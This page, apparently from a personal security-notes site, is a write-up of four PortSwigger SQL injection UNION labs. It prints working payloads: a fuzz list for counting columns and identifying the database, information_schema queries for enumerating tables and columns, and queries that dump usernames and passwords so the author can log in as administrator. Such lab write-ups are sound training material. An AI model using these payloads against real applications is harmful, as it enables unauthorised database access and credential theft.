      <a href="../../../PG/Linux%20-%20Cassios/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cassios
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    RE101
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            RE101
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../RE101/3.%20Simple%20Lambdas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3. Simple Lambdas
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Random Thoughts
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Random Thoughts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Random_Thoughts/010622-1824/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Pentest or... not?
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Random_Thoughts/Building%20a%20Personal%20Containerized%20Web%20Pentest%20Lab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Building a Personal Containerized Web Pentest Lab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Random_Thoughts/Password%20Management%20with%20Self-Hosted%20KeeWeb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password Management with Self-Hosted KeeWeb
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" class="md-nav__link">
    SQL injection UNION attack, determining the number of columns returned by the query
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, determining the number of columns returned by the query">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mapping-visible-content" class="md-nav__link">
    Mapping Visible Content
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mapping-attack-surface" class="md-nav__link">
    Mapping Attack Surface
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-analysis-exploitation" class="md-nav__link">
    Vulnerability Analysis / Exploitation
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability Analysis / Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#testing-view-details" class="md-nav__link">
    Testing "View Details"
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#testing-category-filter" class="md-nav__link">
    Testing "Category Filter"
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-finding-a-column-containing-text" class="md-nav__link">
    SQL injection UNION attack, finding a column containing text
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, finding a column containing text">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-retrieving-data-from-other-tables" class="md-nav__link">
    SQL injection UNION attack, retrieving data from other tables
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, retrieving data from other tables">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment_1" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-enumeration" class="md-nav__link">
    Database Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Database Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-database-version" class="md-nav__link">
    Enumerating Database Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-tables" class="md-nav__link">
    Enumerating Tables
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-columns" class="md-nav__link">
    Enumerating Columns
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" class="md-nav__link">
    SQL injection UNION attack, retrieving multiple values in a single column
  </a>
  
    <nav class="md-nav" aria-label="SQL injection UNION attack, retrieving multiple values in a single column">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment_2" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-enumeration_1" class="md-nav__link">
    Database Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Database Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-database-version_1" class="md-nav__link">
    Enumerating Database Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-tables-in-database" class="md-nav__link">
    Enumerating Tables in Database
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-columns-in-users-table" class="md-nav__link">
    Enumerating Columns in "users" Table
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_2" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="sql-injection-union-attack">SQL Injection UNION Attack<a class="headerlink" href="#sql-injection-union-attack" title="Permanent link">&para;</a></h1>
<ul>
<li>More on SQL UNION injection can be understood at portswigger's guide on <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION attacks</a>.</li>
</ul>
<h2 id="sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">SQL injection UNION attack, determining the number of columns returned by the query<a class="headerlink" href="#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" title="Permanent link">&para;</a></h2>
<ul>
<li>To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. </li>
</ul>
<h3 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h3>
<h4 id="mapping-visible-content">Mapping Visible Content<a class="headerlink" href="#mapping-visible-content" title="Permanent link">&para;</a></h4>
<ul>
<li>We are given the website below with the following functions : "Login", "View Details", and "Category Filter" </li>
</ul>
<p><img alt="Pasted image 20220823142712.png" src="../Media/Pasted%20image%2020220823142712.png" /></p>
<ul>
<li>The "Login" function uses a POST request to send username and password. </li>
</ul>
<p><img alt="Pasted image 20220823142757.png" src="../Media/Pasted%20image%2020220823142757.png" /></p>
<ul>
<li>Below is the result when invalid credentials are used.</li>
</ul>
<p><img alt="Pasted image 20220823143305.png" src="../Media/Pasted%20image%2020220823143305.png" /></p>
<ul>
<li>The "View Details" function is referenced to <code>/product?productId=&lt;product number&gt;</code>. And each product has its own page.</li>
</ul>
<p><img alt="Pasted image 20220823142840.png" src="../Media/Pasted%20image%2020220823142840.png" /></p>
<p>The "Category Filter" functin also makes use of references <code>/filter?category=&lt;text filter&gt;</code></p>
<p><img alt="Pasted image 20220823142909.png" src="../Media/Pasted%20image%2020220823142909.png" /></p>
<h4 id="mapping-attack-surface">Mapping Attack Surface<a class="headerlink" href="#mapping-attack-surface" title="Permanent link">&para;</a></h4>
<ul>
<li>From quick application mapping above, we can see that there are a few probable vectors of entry for SQLi. The first probable location for SQLi would be "View Details" function and the other is in the "Category Filter" function.</li>
</ul>
<h3 id="vulnerability-analysis-exploitation">Vulnerability Analysis / Exploitation<a class="headerlink" href="#vulnerability-analysis-exploitation" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based">Hacktricks</a> has a good explanation of how we can find out the number of columns in the database and <a href="https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect">payloadbox</a> has a list of payloads we can use to detect SQLi. In this case, we will be using <a href="https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/detect/Generic_UnionSelect.txt">Generic_UnionSelect.txt</a>.</li>
<li>To fuzz for UNION based SQLi, we will use burp intruder.</li>
<li>However, there is some additions we need to make to the <code>UNION SELECT</code> wordlist based on the recommendations by <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#union-select">Hacktricks</a> : </li>
</ul>
<blockquote>
<p>You should use <code>null</code> values as in some cases the type of the columns of both sides of the query must be the same and <code>null</code> is valid in every case.</p>
</blockquote>
<div class="highlight"><pre><span></span><code><span class="mi">1</span><span class="s1">&#39; UNION SELECT null-- - Not working</span>
<span class="s1">1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">-- - Not working</span>
<span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">-- - Worked</span>
</code></pre></div>
<ul>
<li>Hence the above payload should also be added to the test payload.</li>
</ul>
<h4 id="testing-view-details">Testing "View Details"<a class="headerlink" href="#testing-view-details" title="Permanent link">&para;</a></h4>
<p><img alt="Pasted image 20220823213358.png" src="../Media/Pasted%20image%2020220823213358.png" />
<img alt="Pasted image 20220823213803.png" src="../Media/Pasted%20image%2020220823213803.png" /></p>
<ul>
<li>Based on the results above all requests meets with <code>error 400</code> response, it seems like <code>product?productId=&lt;number&gt;</code> is not vulnerable to SQL injection.</li>
</ul>
<h4 id="testing-category-filter">Testing "Category Filter"<a class="headerlink" href="#testing-category-filter" title="Permanent link">&para;</a></h4>
<p><img alt="Pasted image 20220823214123.png" src="../Media/Pasted%20image%2020220823214123.png" />
<img alt="Pasted image 20220823214204.png" src="../Media/Pasted%20image%2020220823214204.png" /></p>
<ul>
<li>There are <code>200 OK</code> response as well as <code>error 500</code>. Hence it seems like this might be the vulnerable function.</li>
<li>We filter for the <code>200 OK</code> responses and check the response results. </li>
<li>Reponse if false would be empty.</li>
</ul>
<p><img alt="Pasted image 20220823214409.png" src="../Media/Pasted%20image%2020220823214409.png" /></p>
<p><img alt="Pasted image 20220823215202.png" src="../Media/Pasted%20image%2020220823215202.png" /></p>
<h2 id="sql-injection-union-attack-finding-a-column-containing-text">SQL injection UNION attack, finding a column containing text<a class="headerlink" href="#sql-injection-union-attack-finding-a-column-containing-text" title="Permanent link">&para;</a></h2>
<ul>
<li>As this exercise builds on the previous exercise "<a href="#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">#SQL injection UNION attack determining the number of columns returned by the query</a>", we will skip the Application Mapping Phase and move straight to the vulnerablity assessment and exploitation phase.</li>
<li>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</li>
</ul>
<h3 id="vulnerability-assessment">Vulnerability Assessment<a class="headerlink" href="#vulnerability-assessment" title="Permanent link">&para;</a></h3>
<ul>
<li>First off we will use burp intruder and the fuzzing list we used above to find out the number of columns that is returned by the query.</li>
</ul>
<p><img alt="Pasted image 20220823223720.png" src="../Media/Pasted%20image%2020220823223720.png" /></p>
<ul>
<li>As can be seen above after filtering for <code>200 OK</code> responses only <code>NULL,NULL,NULL</code> returns to us with the correct response. Hence we know that there are 3 columns. </li>
</ul>
<h3 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h3>
<ul>
<li>Now that we know that there are 3 columns in the table, we will now need to find which column contain text and to do so we will need to fuzz with a string variable in the parameter. The payload used is like below : </li>
</ul>
<p><img alt="Pasted image 20220823224538.png" src="../Media/Pasted%20image%2020220823224538.png" /></p>
<ul>
<li>As can be seen below, only <code>'UNION SELECT NULL,'a',NULL</code> gives a <code>200 OK</code> response and value <code>'a'</code> is included in the table.</li>
</ul>
<p><img alt="Pasted image 20220823224713.png" src="../Media/Pasted%20image%2020220823224713.png" />
<img alt="Pasted image 20220823224742.png" src="../Media/Pasted%20image%2020220823224742.png" /></p>
<ul>
<li>We use the string that is required to solve the lab "TARkG7" and lab is solved.</li>
</ul>
<p><img alt="Pasted image 20220823224938.png" src="../Media/Pasted%20image%2020220823224938.png" /></p>
<h2 id="sql-injection-union-attack-retrieving-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables<a class="headerlink" href="#sql-injection-union-attack-retrieving-data-from-other-tables" title="Permanent link">&para;</a></h2>
<ul>
<li>This lab builds on the above 2 labs and hence, we will skip the application mapping phase and move straight to attacking SQL injection.</li>
<li>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user. </li>
</ul>
<h3 id="vulnerability-assessment_1">Vulnerability Assessment<a class="headerlink" href="#vulnerability-assessment_1" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>We will now test if the query is SQL injectable using Burp Intruder.
<img alt="Pasted image 20220824122539.png" src="../Media/Pasted%20image%2020220824122539.png" />
<img alt="Pasted image 20220824122552.png" src="../Media/Pasted%20image%2020220824122552.png" /></p>
</li>
<li>
<p>We will then test for the columns that can hold strings and it seems like both the columns in the table can hold string data.</p>
</li>
</ul>
<p><img alt="Pasted image 20220824123035.png" src="../Media/Pasted%20image%2020220824123035.png" />
<img alt="Pasted image 20220824123051.png" src="../Media/Pasted%20image%2020220824123051.png" /> <img alt="Pasted image 20220824123106.png" src="../Media/Pasted%20image%2020220824123106.png" /></p>
<h3 id="database-enumeration">Database Enumeration<a class="headerlink" href="#database-enumeration" title="Permanent link">&para;</a></h3>
<ul>
<li>After assessing that the query is vulnerable to SQLi, we will now need to go retrieve information from the database. </li>
<li>However, we will need certain information like the type of databse used the tables in the database, the columns in the table of interest. Hence the following enumeration steps needs to be done.</li>
<li>We will be using this <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">cheatsheet</a> to formulate our payloads for enumeration.</li>
</ul>
<h4 id="enumerating-database-version">Enumerating Database Version<a class="headerlink" href="#enumerating-database-version" title="Permanent link">&para;</a></h4>
<ul>
<li>To conduct any exploit, we will need to know the database version as it will determine the query language that is used.</li>
</ul>
<p><img alt="Pasted image 20220824123434.png" src="../Media/Pasted%20image%2020220824123434.png" /></p>
<ul>
<li>We run through all the possible query languages for the database version and found out that this database uses postgreSQL.</li>
</ul>
<p><img alt="Pasted image 20220824123507.png" src="../Media/Pasted%20image%2020220824123507.png" /></p>
<h4 id="enumerating-tables">Enumerating Tables<a class="headerlink" href="#enumerating-tables" title="Permanent link">&para;</a></h4>
<ul>
<li>Using the <a href="https://www.postgresql.org/docs/current/infoschema-tables.html">PostgreSQL documentation</a> we came up with the following payload. This payload will retrieve table name and table type from information schema. </li>
<li>So that we can find out what are the tables that are available in this database.</li>
</ul>
<div class="highlight"><pre><span></span><code>&#39; UNION SELECT table_name,table_type FROM information_schema.tables --
</code></pre></div>
<ul>
<li>As can be seen below, we see a table that does not seem to be default called "users".</li>
</ul>
<p><img alt="Pasted image 20220824131222.png" src="../Media/Pasted%20image%2020220824131222.png" /></p>
<h4 id="enumerating-columns">Enumerating Columns<a class="headerlink" href="#enumerating-columns" title="Permanent link">&para;</a></h4>
<ul>
<li>We then try to find out what are the columns in the users table and we use the following payload below : </li>
</ul>
<div class="highlight"><pre><span></span><code>&#39; UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name = &#39;users&#39; --
</code></pre></div>
<ul>
<li>As can be seen, there are only 2 columns 'username' and 'password'.</li>
</ul>
<p><img alt="Pasted image 20220824131629.png" src="../Media/Pasted%20image%2020220824131629.png" /></p>
<h3 id="exploitation_1">Exploitation<a class="headerlink" href="#exploitation_1" title="Permanent link">&para;</a></h3>
<ul>
<li>Hence to exploit this we will retrieve all the rows in the columns by using the following payload.</li>
</ul>
<div class="highlight"><pre><span></span><code>&#39; UNION SELECT username,password FROM users --
</code></pre></div>
<p><img alt="Pasted image 20220824131829.png" src="../Media/Pasted%20image%2020220824131829.png" />
<img alt="Pasted image 20220824131839.png" src="../Media/Pasted%20image%2020220824131839.png" />
<img alt="Pasted image 20220824131847.png" src="../Media/Pasted%20image%2020220824131847.png" />
<img alt="Pasted image 20220824131928.png" src="../Media/Pasted%20image%2020220824131928.png" /></p>
<h2 id="sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">SQL injection UNION attack, retrieving multiple values in a single column<a class="headerlink" href="#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" title="Permanent link">&para;</a></h2>
<ul>
<li>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. </li>
<li>The following list of payloads were derived from previous exercises :</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT null--</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,null,null --</span>

<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="w"> </span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,banner FROM v$version --</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="p">,</span><span class="k">null</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,null,banner FROM v$version--</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,,</span><span class="n">banner</span><span class="p">,</span><span class="k">null</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT ,banner,null,null FROM v$version--</span>

<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="w"> </span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,@@version --</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="k">null</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,null,@@version--</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="k">null</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT @@version,null,null--</span>

<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">()</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,version()--</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">(),</span><span class="k">null</span><span class="c1">--</span>
<span class="s1">&#39; UNION SELECT null,null,version()--</span>
<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="k">null</span><span class="c1">--</span>
<span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">(),</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">--</span>
</code></pre></div>
<h3 id="vulnerability-assessment_2">Vulnerability Assessment<a class="headerlink" href="#vulnerability-assessment_2" title="Permanent link">&para;</a></h3>
<ul>
<li>We use burp intruder and the paylaod above to check SQLi, the number of columns that is displayed and the column that allows for string.</li>
</ul>
<p><img alt="Pasted image 20220824150311.png" src="../Media/Pasted%20image%2020220824150311.png" />
<img alt="Pasted image 20220824150335.png" src="../Media/Pasted%20image%2020220824150335.png" /></p>
<ul>
<li>From the results, above, we filter for <code>200 OK</code> responses and found out that there are only 2 columns and the second column is the one that can accept strings.</li>
</ul>
<h3 id="database-enumeration_1">Database Enumeration<a class="headerlink" href="#database-enumeration_1" title="Permanent link">&para;</a></h3>
<h4 id="enumerating-database-version_1">Enumerating Database Version<a class="headerlink" href="#enumerating-database-version_1" title="Permanent link">&para;</a></h4>
<ul>
<li>In the same burp intruder "attack", we also injected various kind of "version" to enumerate the database version. From the enumeration, we know that PostgreSQL is used.</li>
</ul>
<p><img alt="Pasted image 20220824150904.png" src="../Media/Pasted%20image%2020220824150904.png" /></p>
<h4 id="enumerating-tables-in-database">Enumerating Tables in Database<a class="headerlink" href="#enumerating-tables-in-database" title="Permanent link">&para;</a></h4>
<ul>
<li>After ascertaining database version, we send the payload below to enumerate the schema to check for non-default tables. We have to use string concatenation as only one column is available. </li>
</ul>
<div class="highlight"><pre><span></span><code>&#39; UNION SELECT null,table_name||&#39;-&#39;||table_type FROM information_schema.tables--
</code></pre></div>
<ul>
<li>We found that there is an interesting "users" table that is non-default. </li>
</ul>
<p><img alt="Pasted image 20220824151832.png" src="../Media/Pasted%20image%2020220824151832.png" /></p>
<h4 id="enumerating-columns-in-users-table">Enumerating Columns in "users" Table<a class="headerlink" href="#enumerating-columns-in-users-table" title="Permanent link">&para;</a></h4>
<ul>
<li>We then continued to enumerate the columns that are in the "users" table with the payload below. </li>
</ul>
<div class="highlight"><pre><span></span><code>&#39; UNION SELECT null,column_name || &#39;-&#39; || data_type FROM information_schema.columns WHERE table_name = &#39;users&#39; --
</code></pre></div>
<ul>
<li>We find out that there are only two columns in the "users" table - "password" and "username"</li>
</ul>
<p><img alt="Pasted image 20220824152147.png" src="../Media/Pasted%20image%2020220824152147.png" /></p>
<h3 id="exploitation_2">Exploitation<a class="headerlink" href="#exploitation_2" title="Permanent link">&para;</a></h3>
<ul>
<li>We finish by using the payload below to enumerate all the rows in the username and password columns.</li>
</ul>
<div class="highlight"><pre><span></span><code>&#39; UNION SELECT null, username || &#39;-&#39; || password FROM users --
</code></pre></div>
<ul>
<li>As can be seen below, we get the username and passwords of <code>administrator</code>.</li>
</ul>
<p><img alt="Pasted image 20220824152304.png" src="../Media/Pasted%20image%2020220824152304.png" /></p>
<ul>
<li>We logged into the administrator account to finish the challenge.</li>
</ul>
<p><img alt="Pasted image 20220824152402.png" src="../Media/Pasted%20image%2020220824152402.png" /></p>





                
              </article>
            </div>
          
          
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.81fa17fe.min.js"></script>
      
    
  </body>
</html>